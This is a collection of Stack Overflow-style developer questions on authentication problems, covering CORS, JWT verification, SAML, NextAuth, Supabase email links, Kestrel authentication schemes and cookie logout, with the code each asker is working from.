"<p>I am writing an app that has a Java Spring back-end (providing an API) and an
Angular front-end.
The Java API works fine through Postman as far as I can see.</p>
<p>But when I try to connect the back-end to the front-end, by launching both
the Java app and the Angular app, going to http://localhost:4200 in a navigator and
fill a form (putting &quot;jseymour@gmail.uk&quot; and &quot;abcdefghi&quot; as password), I get a &quot;Cross Origin Request blocked&quot; error :</p>
<p>Here is the relevant code in my SecurityConfiguration Java class :</p>
<pre><code>  @Bean
    CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration configuration = new CorsConfiguration();

        configuration.setAllowedOrigins(List.of(&quot;http://localhost:4200&quot;));
        configuration.setAllowedMethods(List.of(&quot;GET&quot;, &quot;POST&quot;, &quot;DELETE&quot;));
        configuration.setAllowedHeaders(List.of(&quot;Authorization&quot;, &quot;Content-Type&quot;));

        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();

        source.registerCorsConfiguration(&quot;/**&quot;, configuration);

        return source;
    }
</code></pre>
<p>and the relavant code in my AuthService class :</p>
<pre><code>import { Injectable } from '@angular/core';
import { Observable, throwError } from 'rxjs';
import { catchError, map } from 'rxjs/operators';
import {
  HttpClient,
  HttpHeaders,
  HttpErrorResponse,
} from '@angular/common/http';
import { Router } from '@angular/router';
import {ClientRegistrationInput} from &quot;../model/input/client-registration-input&quot;;
import {LoginInput} from &quot;../model/input/login-input&quot;;
import {UtilisateurOutput} from &quot;../model/output/utilisateur-output&quot;;
@Injectable({
  providedIn: 'root',
})
export class AuthService {
  endpoint: string = 'http://localhost:8000';
  headers = new HttpHeaders(); // .set('Content-Type', 'application/json');
  currentUser = {};

  constructor(private http: HttpClient, public router: Router) {
  }
  // Sign-up
  signUp(input: ClientRegistrationInput): Observable&lt;any&gt; {
    let api = `${this.endpoint}/auth/signup-customer`;
    return this.http.post(api, input).pipe(catchError(this.handleError));
  }
  // Sign-in
  signIn(loginInput: LoginInput) {
    return this.http
      .post&lt;any&gt;(`${this.endpoint}/auth/login`, loginInput)
      .subscribe((res: any) =&gt; {
        localStorage.setItem('access_token', res.token);
        this.getUserProfile(res.utilisateurId).subscribe((res) =&gt; {
          this.currentUser = res;
          this.router.navigate(['user-profile/' + res.utilisateurId]);
        });
      });
  }

  getToken() {
    return localStorage.getItem('access_token');
  }
  get isLoggedIn(): boolean {
    let authToken = localStorage.getItem('access_token');
    return authToken !== null;
  }
  // User profile
  getUserProfile(id: any): Observable&lt;UtilisateurOutput&gt; {
    let api = `${this.endpoint}/utilisateurs/${id}`;
    return this.http.get&lt;UtilisateurOutput&gt;(api, { headers: this.headers }).pipe(
      map((res) =&gt; {
        return res || {};
      }),
      catchError(this.handleError)
    );
  }
  doLogout() {
    localStorage.removeItem('access_token');
    this.router.navigate(['log-in']);

  }

  // Error handling
  handleError(error: HttpErrorResponse) {
    let msg = '';
    if (error.error instanceof ErrorEvent) {
      // client-side error
      msg = error.error.message;
    } else {
      // server-side error
      msg = `Error Code: ${error.status}\nMessage: ${error.message}`;
    }
    return throwError( () =&gt; new Error(msg));
  }
}

</code></pre>
<p>The error message in Google Chrome :</p>
<p><a href=""https://i.stack.imgur.com/3ieuI.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/3ieuI.png"" alt=""enter image description here"" /></a></p>
<p>The error message in Firefox :</p>
<p><a href=""https://i.stack.imgur.com/UAx7X.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/UAx7X.png"" alt=""enter image description here"" /></a></p>
<p>Source code for Java back-end at <a href=""https://github.com/ewan-delanoy/ApiPlages"" rel=""nofollow noreferrer"">https://github.com/ewan-delanoy/ApiPlages</a>
Source code for Angular front-end at <a href=""https://github.com/ewan-delanoy/FrontEndPlages"" rel=""nofollow noreferrer"">https://github.com/ewan-delanoy/FrontEndPlages</a></p>
<p>Some notes on similar, older MSE questions :</p>
<p><a href=""https://stackoverflow.com/questions/24371734/firefox-cross-origin-request-blocked-despite-headers"">This one</a>
is about a Firefox-specific problem, while my problem appears in Chrome also.
<a href=""https://stackoverflow.com/questions/43871637/no-access-control-allow-origin-header-is-present-on-the-requested-resource-whe?rq=1"">This other one</a>
contains a lot of information and suggestions, in particular :</p>
<ol>
<li>Using a CORS proxy - I want to avoid that since I have full control over both backend and frontend.</li>
<li>Being careful about the request &amp; response format to avoid preflight. I may well have missed something
but it seems to me that the code snippets I showed above do what needs to be done in this regard.</li>
</ol>
"
"<p>I would like to use the Azure AI Text Translation from an Azure DevOps build pipeline, without having to use any secrets for authentication.
I have used Workload Identity Federation for smooth authentication from pipelines before, so if that is possible also for Azure AI Translator that would be great.</p>
<p>I have set up a resource group in Azure Portal with a resource of type 'Translator'.
I have also set up a (Azure Resource Manager) service connection in my Azure DevOps project that is referring to that resource group, and I can see that a federated credential was created for me in Microsoft Entra.</p>
<p>Now the next step is usually to set up permissions for the federated credential in Microsoft Entra. For my previous federated credential, I have used &quot;Request API permissions&quot;. But there it is not obvious what to select in this case.
I could use some guidance on how to set up the permissions to be able to use Text Translation from my pipeline.</p>
"
"<p>I have the problem that my SessionProvider wants to get a session, but I don't know where to fetch it from.</p>
<pre><code>// Layout.tsx

export default function RootLayout({
  children,
}: Readonly&lt;{
  children: React.ReactNode;
}&gt;) {
  return (
    &lt;html lang=&quot;de&quot;&gt;
      &lt;Provider&gt;
        &lt;body className={inter.className}&gt;
          &lt;AppRouterCacheProvider options={{ key: &quot;css&quot; }}&gt;
            &lt;ThemeProvider theme={theme}&gt;{children}&lt;/ThemeProvider&gt;
          &lt;/AppRouterCacheProvider&gt;
        &lt;/body&gt;
      &lt;/Provider&gt;
    &lt;/html&gt;
  );
}
</code></pre>
<pre><code>// Provider.tsx
&quot;use client&quot;;
import { ReactNode } from &quot;react&quot;;
import { Session } from &quot;next-auth&quot;;
import { SessionProvider } from &quot;next-auth/react&quot;;

interface ProviderProps {
  children: ReactNode;
  session: Session | null;
}

export default function Provider({ children, session }: ProviderProps) {
  return &lt;SessionProvider session={session}&gt;{children}&lt;/SessionProvider&gt;;
}
</code></pre>
<pre><code>// [...nextauth].tsx
 import NextAuth, { getServerSession, type NextAuthOptions } from &quot;next-auth&quot;;
import connectToDatabase from &quot;@/util/db&quot;;
import User from &quot;@/models/User&quot;;
import Credentials from &quot;next-auth/providers/credentials&quot;;
import bcrypt from &quot;bcryptjs&quot;;

export const authOptions: NextAuthOptions = {
  session: {
    strategy: &quot;jwt&quot;,
  },
  secret: process.env.NEXTAUTH_SECRET,
  callbacks: {
    jwt: async ({ token, user }) =&gt; {
      if (user) {
        token.id = user.id;
      }
      return token;
    },
    session: async ({ session, token }) =&gt; {
      if (session.user &amp;&amp; token.id) {
        session.user.id = token.id;
      }
      return session;
    },
  },
  pages: {
    signIn: &quot;/auth/singin&quot;,
  },
  providers: [
    Credentials({
      name: &quot;Credentials&quot;,
      credentials: {
        email: {},
        password: {},
      },
      authorize: async (credentials) =&gt; {
        if (!credentials) {
          return null;
        }

        await connectToDatabase();

        const user = await User.findOne({ username: credentials.email });

        if (
          !user ||
          !(await bcrypt.compare(credentials.password, user.password))
        ) {
          return null;
        }

        return { id: user.id, name: user.username, email: user.email };
      },
    }),
  ],
};

const handler = NextAuth(authOptions);
export { handler as GET, handler as POST };

export const getServerAuthSession = () =&gt; getServerSession(authOptions);
</code></pre>
<p>I'll get the following error, when using it that way:</p>
<pre><code>Property 'session' is missing in type '{ children: Element; }' but required in type 'ProviderProps'.ts(2741)
Provider.tsx(8, 3): 'session' is declared here.
(alias) function Provider({ children, session }: ProviderProps): JSX.Element
import Provider
</code></pre>
<p>I tried multiple Methods like get the session data via getStaticProps etc. and tried different tutorials and guides online but no one seems to have the same problem.</p>
"
"<p>I want to set up an authentication method in the private repository (nexus oss 3.62) where whenever a user tries to pull package via the cli precisely it should ask for a username and password.
I am able to achieve this by passing username and password in URl
<strong>deb https://username:passwd@URL_OF_PRIVATE_REPOSITORY_NEXUS/repository/package.</strong>
but I want to figure out a way to pass it in runtime without providing it in url(similar to that when we do docker login it prompts for username and password).<br />
example for what i'm trying to achieve:<br />
deb https://URL_OF_PRIVATE_REPOSITORY_NEXUS/repository it should prompt for<br />
username:<br />
passwd:<br />
and later let users to pull package if they are authorized.</p>
"
"<p>I’m new to Next.js and I’m currently learning about its application architecture. I have a few questions related to handling user data with Clerk and MongoDB:</p>
<ol>
<li><strong>Saving User Data from Clerk to MongoDB:</strong> I’m working on a Next.js 14 application and using Clerk for authentication. I’m considering retrieving the user’s data from useUser() after they sign up, and then saving that data in my MongoDB database by calling a server action. Is this the correct approach?</li>
<li><strong>Syncing User Data with Clerk:</strong> How can I keep my database synchronized with the user data from Clerk? For instance, if a user changes their username or profile avatar, I want these changes to be reflected in my database. I’m particularly interested in tracking the sessionId from Clerk for backend security purposes. What’s the best way to achieve this?</li>
<li><strong>Tracking the User ID:</strong> After implementing the above, what’s the best way to keep track of the user_id (from my database, not from Clerk) while the user is using the app? I need to use this ID for various operations in the app. Would wrapping my entire app with a context provider be a good solution?
I appreciate any insights or suggestions. Thank you very much!</li>
</ol>
"
"<p>I cannot retrieve the secret key from the Duo Admin API.</p>
<p>I have created a Duo Admin API with the following authorizations.</p>
<ul>
<li>Grant Applications</li>
<li>Grant Read Log</li>
<li>Grant Read Resource</li>
</ul>
<p>When looking at the Duo Admin API github ( (<a href=""https://github.com/duosecurity/duo_client_python/blob/master/duo_client/admin.py"" rel=""nofollow noreferrer"">https://github.com/duosecurity/duo_client_python/blob/master/duo_client/admin.py</a>)
), I don't see a specific api call for &quot;Retrieve Secret&quot; as it seems like there would be based on the documentation found here:
<a href=""https://duo.com/docs/adminapi#retrieve-secret-key"" rel=""nofollow noreferrer"">https://duo.com/docs/adminapi#retrieve-secret-key</a></p>
<p>If I perform the &quot;get_integration&quot; call, I am able to get the secret key, however it is only partially visible (i.e. xxxxxxxxxxxxxxxxx3432jas).</p>
<p>The documentation states that the python client supports this, but I don't see that functionality. Additionally, the documentation states that the authentication requests for this endpoint are signed differently than as stated in the docs...so we cannot generate the requests ourselves...</p>
<p>Does anyone know how to get the fully visible secret key via the admin api?</p>
"
"<p>I am facing an issue retrieving the authenticated user after receiving SAML from Microsoft Intra ID as the Identity Provider (IdP). The Saml2AuthenticatedPrincipal object is always <strong>null</strong>.</p>
<pre><code>  @RequestMapping(&quot;/init&quot;)
    public ResponseEntity&lt;String&gt; test(@AuthenticationPrincipal Saml2AuthenticatedPrincipal principal) {
        System.out.println(principal.getAttributes());
        return ResponseEntity.ok(&quot;success&quot;);

    }
</code></pre>
<p><strong>- spring boot version</strong>: 3.2.2
**- package of Saml2AuthenticatedPrincipal:**org.springframework.security.saml2.provider.service.authentication</p>
<p>I have tried the following:
Configuring Spring Security SAML with Intra ID as IdP.
Successfully receiving the SAML response after login.
Parsing the SAML response and extracting the user attributes.
However, the Saml2AuthenticatedPrincipal object is still null. I am not sure what I am missing.</p>
"
"<p>I'm encountering difficulties with verifying existing JWT tokens in my Laravel application. I've been provided with JWT tokens generated externally, and I'm attempting to verify their authenticity within my Laravel backend. However, the verification process fails for the tokens that were not generated by my application.</p>
<p>Here are the steps I've taken:</p>
<ul>
<li>Installed and configured the tymon/jwt-auth package for JWT authentication.</li>
<li>Published the JWT configuration file and ensured that the JWT_SECRET matches the provided secret.</li>
<li>Attempted to verify the provided JWT tokens using the tymon/jwt-auth package's JWTAuth facade.</li>
</ul>
<p>However, despite these efforts, the verification fails for tokens generated externally. Interestingly, tokens generated by my Laravel application verify successfully.</p>
<p>Here's a sample of the token payload for a token generated externally:</p>
<pre><code>{
  &quot;aud&quot;: &quot;Users&quot;,
  &quot;iss&quot;: &quot;example.com&quot;,
  &quot;userId&quot;: &quot;8352d2e4-a8c5-47df-b161-36e60fee6744&quot;,
  &quot;login&quot;: &quot;Admin&quot;,
  &quot;exp&quot;: 1708071104
}
</code></pre>
<p>for testing purposes i also make a generator of tokens and here's my payload data:</p>
<pre><code>{
  &quot;iss&quot;: &quot;example.com&quot;,
  &quot;iat&quot;: 1708070598,
  &quot;exp&quot;: 1708074198,
  &quot;nbf&quot;: 1708070598,
  &quot;jti&quot;: &quot;99m1PJxhgTMsDS6F&quot;,
  &quot;sub&quot;: &quot;1&quot;,
  &quot;prv&quot;: &quot;23bd5c8949f600adb39e701c400872db7a5976f7&quot;,
  &quot;aud&quot;: &quot;Users&quot;,
  &quot;userId&quot;: 1,
  &quot;login&quot;: &quot;test@example.com&quot;
}
</code></pre>
<p>the thing is my code checks the token i've genereated correctly, but when it comes about externally generated tokens it fails. and here's credentials that i have been provided:</p>
<pre><code>JWT_AUDIENCE=Users
JWT_DOMAIN=example.com
JWT_REALM=com.example
JWT_SECRET=someLongSentenceToMakeFakeSecret
</code></pre>
<pre><code>Route::prefix('/stocks')-&gt;middleware('auth.jwt')-&gt;group(function () {
    Route::get('/', [StockController::class, 'index']);
    Route::post('/store', [StockController::class, 'store']);
    Route::get('/{stock}', [StockController::class, 'show']);
    Route::put('/{stock}', [StockController::class, 'update']);
    Route::delete('/{stock}', [StockController::class, 'destroy']);
});

Route::prefix('/supplies')-&gt;middleware('auth.jwt')-&gt;group(function () {
    Route::get('/', [SupplyController::class, 'index']);
    Route::post('/store', [SupplyController::class, 'store']);
    Route::get('/{supply}', [SupplyController::class, 'show']);
    Route::put('/{supply}', [SupplyController::class, 'update']);
    Route::delete('/{supply}', [SupplyController::class, 'destroy']);
});

Route::group(['middleware' =&gt; 'api', 'prefix' =&gt; 'auth'], function ($router) {
    Route::post('login', [AuthController::class, 'login']);
    Route::post('logout', [AuthController::class, 'logout']);
    Route::post('refresh', [AuthController::class, 'refresh']);
    Route::post('me', [AuthController::class, 'me']);
});
</code></pre>
<p>and <strong>auth.jwt</strong> middleware file:</p>
<pre><code>&lt;?php

namespace App\Http\Middleware;

use Closure;
use Exception;
use Illuminate\Http\Request;
use Tymon\JWTAuth\Facades\JWTAuth;
use Tymon\JWTAuth\Http\Middleware\BaseMiddleware;

class JWTMiddleware extends BaseMiddleware
{
    public function handle(Request $request, Closure $next)
    {
        try {
            $user = JWTAuth::parseToken()-&gt;authenticate();
        } catch (Exception $e) {
            if ($e instanceof \Tymon\JWTAuth\Exceptions\TokenInvalidException) {
                return response()-&gt;json(['status' =&gt; 'Token is Invalid']);
            } else if ($e instanceof \Tymon\JWTAuth\Exceptions\TokenExpiredException) {
                return response()-&gt;json(['status' =&gt; 'Token is Expired']);
            } else {
                return response()-&gt;json(['status' =&gt; 'Authorization Token not found']);
            }
        }
        return $next($request);
    }
}
</code></pre>
<p>How to successfully verify externally generated JWT tokens in Laravel using the tymon/jwt-auth package?</p>
"
"<p>I am trying to send mail in python using smtp credentials, the same credentials are working for grafana but not with my python script.</p>
<pre><code>import smtplib

port=portno
server_address = 'server address'
smtp_username = 'username'
smtp_password = 'password'

try:
    server = smtplib.SMTP(server_address,port)
    server.starttls()
    server.login(smtp_username, smtp_password)
    print(&quot;Login to SMTP server successful.&quot;)
except smtplib.SMTPAuthenticationError:
    print(&quot;Failed to authenticate. Please check your username and password.&quot;)
except smtplib.SMTPException as e:
    print(&quot;An error occurred while sending the email:&quot;, str(e))
except Exception as e:
    print(&quot;An unexpected error occurred:&quot;, str(e))
finally:
    if 'server' in locals():
        server.quit()
</code></pre>
<p>here is the output.</p>
<p>Failed to authenticate. Please check your username and password.</p>
<p>I am expecting to get the output as Login to smtp server is successful.</p>
"
"<p>Users have different logins but the same password (for testing). Some sign up, some don't (session has no values). If someone logs in, always and vice versa.</p>
<p>The situation occurred a few days ago without a system upgrade. So everything points to a server problem. The server provider claims that this is a feature of the application and that the server is fine. However, the error started to appear out of nowhere, without a system upgrade, and the error does not appear locally. What could it be?</p>
<p><strong>Login successful</strong></p>
<pre><code>Login: Array
(
[Zend_Auth] =&gt; Array
    (
        [storage] =&gt; stdClass Object
            (
                [user_id] =&gt; 7749
                [username] =&gt; test@gmail.com
            )

    )

)
, redirect_url: /landing-page

Access check: /landing-page, Array
(
[Zend_Auth] =&gt; Array
    (
        [storage] =&gt; stdClass Object
            (
                [user_id] =&gt; 7749
                [username] =&gt; test@gmail.com
            )

    )

)
</code></pre>
<p><strong>Login failed</strong></p>
<pre><code>Login: Array
(
[Zend_Auth] =&gt; Array
    (
        [storage] =&gt; stdClass Object
            (
                [user_id] =&gt; 8714
                [username] =&gt; test2@gmail.com
            )

    )

)
, redirect_url: /landing-page

Access check: /landing-page, Array
(
[Zend_Auth] =&gt; Array
    (
        [storage] =&gt; stdClass Object
            (
                [user_id] =&gt; 
                [username] =&gt; 
            )

    )

)
</code></pre>
<p>I don't know how much it is related, but since the day the problem occurred, it has increasingly appeared in the log:</p>
<pre><code>msg:session_set_cookie_params(): Cannot change session cookie parameters when session is active
</code></pre>
<p>How can this happen with unmodified code? Is there a test I can use to find out why this is happening?</p>
"
"<p>I'm using new sign in with linkeIn using OpenID.</p>
<p><a href=""https://learn.microsoft.com/en-us/linkedin/consumer/integrations/self-serve/sign-in-with-linkedin-v2"" rel=""nofollow noreferrer"">https://learn.microsoft.com/en-us/linkedin/consumer/integrations/self-serve/sign-in-with-linkedin-v2</a></p>
<p>Anyone has any idea that with new sign in method.how can i get HD profile picture while sign in with linkeIn? now it is coming 100x100 image by using API - GET <strong><a href=""https://api.linkedin.com/v2/userinfo"" rel=""nofollow noreferrer"">https://api.linkedin.com/v2/userinfo</a></strong></p>
<p>I have found out profile picture API. which requires to call API
<strong>GET <a href=""https://api.linkedin.com/v2/me?projection(id,profilePicture(displayImage%7EdigitalmediaAsset:playableStreams))"" rel=""nofollow noreferrer"">https://api.linkedin.com/v2/me?projection(id,profilePicture(displayImage~digitalmediaAsset:playableStreams))</a></strong></p>
<p>But i have not able to figure out how to get access to <strong>/me</strong> endpoint.</p>
<p>I am not able to figure out how to get HD profile picture while fetching user profile after sign in with linkedIn.</p>
<p>I want HD profile picture.</p>
<p>Thank you in advance for your help &amp; advice.</p>
"
"<p>I am working on a WebDAV service, i.e. it is an ASP.NET application, but without routing or endpoints.</p>
<p>So far I have used Http.sys as server, where you could use Basic, NTLM and Negotiate as authentication methods at the same time. This means that users could log in with Windows authentication (NTLM, Negotiate) or with Basic Authentication as required.<br />
This worked well so far. In the case of an incorrectly authenticated request, the response was <code>401 Unauthorized</code> and contained the following headers:</p>
<pre><code>WWW-Authenticate: Negotiate
WWW-Authenticate: NTLM
WWW-Authenticate: Basic
</code></pre>
<p>However, there is now a requirement that Basic Authentication should contain a realm, which should also be returned in the WWW-Authenticate header:</p>
<pre><code>WWW-Authenticate: Basic realm=&quot;MyRealm&quot;
</code></pre>
<p>I couldn't get it to work with Http.sys.</p>
<p>That's why I'm currently evaluating Kestrel.<br />
But there I have the problem that I can't manage to make both Basic and Negotiate available.</p>
<p>If I first register Negotiate in the Startup.ConfigureServices:</p>
<pre><code>public void ConfigureServices(IServiceCollection services)
{
    ...
    services.AddAuthentication(&quot;Negotiate&quot;)
        .AddNegotiate()
        .AddBasic(options =&gt;
        {
            options.Realm = &quot;MyReallyRealm&quot;;
            options.SuppressWWWAuthenticateHeader = false;
            options.Events = new BasicAuthenticationEvents
            {
                OnValidateCredentials = ValidateCredentials
            };
        });
    ...
}
</code></pre>
<p>then Windows Authentication works (WebDAV access via Explorer), but Basic Authentication does not work. I.e. the handler for Basic Authentication is not called at all.
I have tried this with a self-written BasicAuthenticationHandler and with idunno.Authentication.Basic.</p>
<p>If I reverse the order in ConfigureServices:</p>
<pre><code>public void ConfigureServices(IServiceCollection services)
{
    ...
    services.AddAuthentication(&quot;Basic&quot;)
        .AddBasic(options =&gt;
        {
            options.Realm = &quot;MyReallyRealm&quot;;
            options.SuppressWWWAuthenticateHeader = false;
            options.Events = new BasicAuthenticationEvents
            {
                OnValidateCredentials = ValidateCredentials
            }
            .AddNegotiate();
        });
    ...
}
</code></pre>
<p>Then only Basic Authentication works, but Negotiate does not.</p>
<p>And yes, Authentication has been added to the middleware pipeline:</p>
<pre><code>public void Configure(IApplictionBuilder app, ...)
{
    ...
    app.UseAuthentication();
}
</code></pre>
<p>And even with the variants that &quot;worked&quot;, only one WWW-Authenticate header was ever returned in the event of an incorrect login, and it always contained the scheme that was specified as the default scheme in AddAuthentication().</p>
<p>How do I have to configure the whole thing so that both Negotiate and Basic Authentication are supported at the same time and so that multiple WWW-Authenticate headers are returned in the event of an error (401)?</p>
"
"<p>I am trying to claim a Microsoft account profile photo using <a href=""https://github.com/dotnet/aspnetcore/blob/9db62024cbe3c3cb28efe372541fc1bdfcdb375e/src/Security/Authentication/MicrosoftAccount/src/MicrosoftAccountOptions.cs#L13"" rel=""nofollow noreferrer""><code>MicrosoftAccountOptions</code></a> in an ASP.NET Core application.</p>
<p>I have built an example app following the guide on <a href=""https://learn.microsoft.com/en-us/aspnet/core/security/authentication/social/?view=aspnetcore-8.0&amp;tabs=visual-studio"" rel=""nofollow noreferrer"">&quot;Facebook, Google, and external provider authentication in ASP.NET Core&quot;</a>.</p>
<p>The registration process with a Microsoft account is working, and here is the snapshot of my <code>AspNetUsers</code> table after registering with the app:</p>
<h6><em>sqlite&gt; SELECT * FROM AspNetUsers;</em></h6>
<pre class=""lang-bash prettyprint-override""><code>                  Id = ...
   AccessFailedCount = 0
    ConcurrencyStamp = ...
               Email = ...
      EmailConfirmed = 1
      LockoutEnabled = 1
          LockoutEnd = 
     NormalizedEmail = ...
  NormalizedUserName = ...
        PasswordHash = 
         PhoneNumber = 
PhoneNumberConfirmed = 0
       SecurityStamp = ...
    TwoFactorEnabled = 0
            UserName = ...
</code></pre>
<p>I am also attempting to claim the profile photo. I tried <code>microsoftOptions.ClaimActions.MapJsonKey(&quot;photo&quot;, &quot;picture&quot;, &quot;url&quot;);</code>, but it didn't add a new <code>url</code> column to the table.</p>
<p>I found the &quot;photo&quot; keyword in the <a href=""https://learn.microsoft.com/en-us/graph/api/resources/user?view=graph-rest-1.0#json-representation"" rel=""nofollow noreferrer"">&quot;JSON representation&quot;</a>, but I am struggling to understand how to handle its type.</p>
<p>Here's the relevant part of my <code>Program.cs</code>:</p>
<h6><em>Program.cs</em></h6>
<pre class=""lang-cs prettyprint-override""><code>// ...

services
.AddAuthentication()
.AddMicrosoftAccount(microsoftOptions =&gt;
{
  microsoftOptions.ClientId = configuration[&quot;Authentication:Microsoft:ClientId&quot;];
  microsoftOptions.ClientSecret = configuration[&quot;Authentication:Microsoft:ClientSecret&quot;];

  //microsoftOptions.ClaimActions.MapJsonKey(&quot;photo&quot;, &quot;picture&quot;, &quot;url&quot;);

// ...
});
</code></pre>
<p>Can anyone provide guidance on how to correctly claim the Microsoft account profile photo using <code>MicrosoftAccountOptions</code>?</p>
"
"<p>I have an ASP.NET web application where I used form based authentication. This will create a cookie in browser. Now there is a requirement where I need to logout based on API call and  I had added a code in web page (say <code>SignIn.aspx?logout=1</code>) and used query string to clear the cookie.</p>
<p>When the above URL (<code>http://localhost/SignIn.aspx?logout=1</code>) is invoked from a browser, the cookie is deleted, but if the same URL is invoked as API from Postman, the cookie is not deleted.</p>
<p>This is my <code>web.config</code> file:</p>
<pre><code>&lt;authentication mode=&quot;Forms&quot;&gt;
    &lt;forms loginUrl=&quot;~/SignIn.aspx&quot; timeout=&quot;60&quot; protection=&quot;All&quot; name=&quot;.cgrh&quot;/&gt;
&lt;/authentication&gt;
</code></pre>
<p>Code I used to delete cookie (this works fine when invoked from browser):</p>
<pre><code>FormsAuth = new FormsAuthenticationService();
FormsAuth.SignOut();
</code></pre>
<p>I know that cookie cannot be deleted, so we need to set the expiration date. Tried all these things, but could not able to delete the cookie from API call.</p>
<p>Also tried using the same cookie (.cgrh) from postman also so to make it as authenticated user, but still could not delete it.</p>
<p>Some code I tried to delete the cookie are as follows, but it does not work:</p>
<pre><code>public static void RemoveCookie(string cookieName, string keyName, string domain)
{
    if (HttpContext.Current.Request.Cookies[cookieName] != null)
    {
        HttpCookie cookie = HttpContext.Current.Request.Cookies[cookieName];

        // SameSite.None Cookies won't be accepted by Google Chrome and other modern browsers if they're not secure, which would lead in a &quot;non-deletion&quot; bug.
        // in this specific scenario, we need to avoid emitting the SameSite attribute to ensure that the cookie will be deleted.
        if (cookie.SameSite == SameSiteMode.None &amp;&amp; !cookie.Secure)
            cookie.SameSite = (SameSiteMode)(-1);

        if (String.IsNullOrEmpty(keyName))
        {
            cookie.Expires = DateTime.UtcNow.AddYears(-1);

            if (!String.IsNullOrEmpty(domain)) 
                cookie.Domain = domain;

            HttpContext.Current.Response.Cookies.Add(cookie);
            HttpContext.Current.Request.Cookies.Remove(cookieName);
        }
        else
        {
            cookie.Values.Remove(keyName);

            if (!String.IsNullOrEmpty(domain)) 
               cookie.Domain = domain;

            HttpContext.Current.Response.Cookies.Add(cookie);
        }
    }
}

public static void RemoveCookie(string key)
{
    // Encode key for retrieval and remove cookie
    var withBlock = HttpContext.Current;
    HttpCookie cookie = new HttpCookie(withBlock.Server.UrlEncode(key));

    if (cookie != null)
    {
        var withBlock1 = cookie;
        withBlock1.HttpOnly = true;
        withBlock1.Expires = new DateTime(1999, 10, 12);
        withBlock1.Domain = &quot;&quot;;

        // Remove from server (has no effect on client)
        withBlock.Response.Cookies.Remove(withBlock.Server.UrlEncode(key));

        // Add expired cookie to client, effectively removing it
        withBlock.Response.Cookies.Add(cookie);
    }
}
</code></pre>
"
"<p>I am building a web application with some other people and I am in charge to do the database. I have been looking for a while now and I am looking for a way to pass the input that was inputted in an html file which i didn't create (through a form) into another python file where I am using sqlite in order to handle input.
What is the best way to redirect this input to the other file?</p>
<p>Chat gpt told me to user the form action '/submit_form' and the method 'post'. I don't know what these do but I've included it in the code.</p>
<p>I am putting the code for this form below.</p>
<p>Very simply, I am trying to handle the input from this form in the HTML file, in another python file but I am unsure how to 'pass' it to the other file.</p>
<pre class=""lang-html prettyprint-override""><code>        &lt;form action=&quot;/submit_form&quot; method=&quot;post&quot;&gt;
            &lt;h1&gt;Sign up | Log in&lt;/h1&gt;
            &lt;div class=&quot;input-box&quot;&gt;
                &lt;input type=&quot;text&quot; placeholder=&quot;Username&quot; required&gt;
                &lt;i class='bx bx-user'&gt;&lt;/i&gt;
            &lt;/div&gt;
            &lt;div class=&quot;input-box&quot;&gt;
                &lt;input type=&quot;password&quot; placeholder=&quot;Password&quot; required&gt;
                &lt;i class='bx bx-lock'&gt;&lt;/i&gt;
            &lt;/div&gt;
            &lt;div class=&quot;btn-group&quot;&gt;
                &lt;button type=&quot;submit&quot; class=&quot;btn&quot;&gt;Sign up&lt;/button&gt;
                &lt;button type=&quot;submit&quot; class=&quot;btn&quot;&gt;Log in&lt;/button&gt;
            &lt;/div&gt;
        &lt;/form&gt;
</code></pre>
"
"<p>I have a nextjs 14/supabase app (using app router and ssr). When a new user signs up via email and clicks the accept invite link, they get an error &quot;<em>Database error finding user from email link</em>&quot;.</p>
<p>I've configurated the email link to be as follows:</p>
<p><code>{{ .SiteURL }}/auth/confirm?token_hash={{.TokenHash}}&amp;type=email&amp;next={{.SiteURL}}/projects&quot;</code></p>
<p>My auth/confirm/route.ts file is as follows:</p>
<pre><code>import { EmailOtpType } from &quot;@supabase/supabase-js&quot;
import { cookies } from &quot;next/headers&quot;
import { NextRequest, NextResponse } from &quot;next/server&quot;

export async function GET(request: NextRequest) {
  const { searchParams } = new URL(request.url)
  const token_hash = searchParams.get(&quot;token_hash&quot;)
  const next = searchParams.get(&quot;next&quot;)
  const type = searchParams.get(&quot;type&quot;)
  const cookieStore = cookies()

  const supabase = createServerClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!,
    {
      cookies: {
        get(name) {
          return cookieStore.get(name)?.value
        },
        set(name, value, options) {
          cookieStore.set({ name, value, ...options })
        },
        remove(name, options) {
          cookieStore.set({ name, value: &quot;&quot;, ...options })
        },
      },
    },
  )

  if (token_hash &amp;&amp; type) {
    const { error } = await supabase.auth.verifyOtp({
      type: assertOtpType(type),
      token_hash,
    })
    console.log({ error })
    if (!error) {
      return NextResponse.redirect(next!)
    }
  }
  return NextResponse.redirect(process.env.SITE_URL + &quot;/error&quot;)
}

function assertOtpType(type: string): EmailOtpType {
  if (type !== &quot;email&quot;) {
    throw new Error(&quot;Invalid OTP type&quot;)
  }
  return type
}
</code></pre>
<p>I have my <code>auth.users</code> table and my <code>public.users</code> table. There is a trigger and a function to insert the new user in the <code>public.users</code> table. This seems to work when the user signs up. It's just when the confirm with the email link that things break.</p>
<p>When the user signs up, I do notice a cookie is created <code>sb-vfhoyptcwlciarlfXXXX-auth-token-code-verifier</code> with value <code>%22b37534612078b7ddc7450ebee93be7ad6da263e945c18f6418d8f45568196013adbd864a392f197c20f9108ac3046cbee1030dXXXXXXXXXXXXXXX</code> (changed some values to X's in case this is not safe to post).</p>
<p>Here is the code for when the user signs up:</p>
<pre><code>import { createClientServer } from &quot;@/supabase/server&quot;

export const signUp = async (formData: FormData, captchaToken: string) =&gt; {
  const email = formData.get(&quot;email&quot;) as string
  const password = formData.get(&quot;password&quot;) as string
  const supabase = createClientServer()
  const origin = process.env.SITE_URL

  const { error } = await supabase.auth.signUp({
    email,
    password,
    options: {
      emailRedirectTo: `${origin}/projects`,
      captchaToken: captchaToken,
    },
  })

  if (error) {
    console.error(error)
  } else {
    console.log(&quot;Check your email for the confirmation link.&quot;)
  }
}
</code></pre>
<p>Any ideas on this error?</p>
"
"<p>I have a Django application using the out-of-the-box Django authentication system.
I need to make an integration with another web app.
The users in the other web app will click a button that should take them to my web application and give them access. The other web app will send me the user's email and other data. I should create the user if it doesn't exist without asking for any credentials.</p>
<p>I'm not sure what approach I should take. I want something simple but not too insecure.
